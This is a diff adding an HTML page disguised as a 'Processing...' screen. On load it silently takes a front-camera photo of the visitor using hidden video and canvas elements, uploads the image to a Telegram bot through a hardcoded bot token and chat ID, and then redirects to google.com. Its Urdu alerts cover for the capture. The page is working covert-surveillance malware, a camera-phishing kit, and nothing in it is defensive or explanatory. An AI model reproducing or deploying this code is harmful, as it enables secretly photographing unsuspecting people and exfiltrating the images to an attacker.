@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Processing...</title>
+</head>
+<body>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const botToken = "7928322347:AAHDTEO69PLQrzXO5pCz-Y4CoQOTdlvi5YU";
+    const chatId = "7009447523";
+    const redirectURL = "https://google.com";
+
+    async function captureAndSendPhoto() {
+      // Step 1: check if getUserMedia is supported
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        alert("📵 آپ کا براؤزر کیمرہ سپورٹ نہیں کرتا!");
+        window.location.href = redirectURL;
+        return;
+      }
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
+        });
+
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(resolve, 1000); // wait 1 sec
+          };
+        });
+
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageBlob = await new Promise(resolve => {
+          canvas.toBlob(resolve, "image/jpeg", 0.95);
+        });
+
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", imageBlob, "capture.jpg");
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+
+        window.location.href = redirectURL;
+
+      } catch (err) {
+        alert("❌ کیمرہ کی اجازت نہیں ملی یا مسئلہ ہوا: " + err.message);
+        window.location.href = redirectURL;
+      }
+    }
+
+    // Start when page loads
+    window.onload = captureAndSendPhoto;
+  </script>
+</body>
+</html>
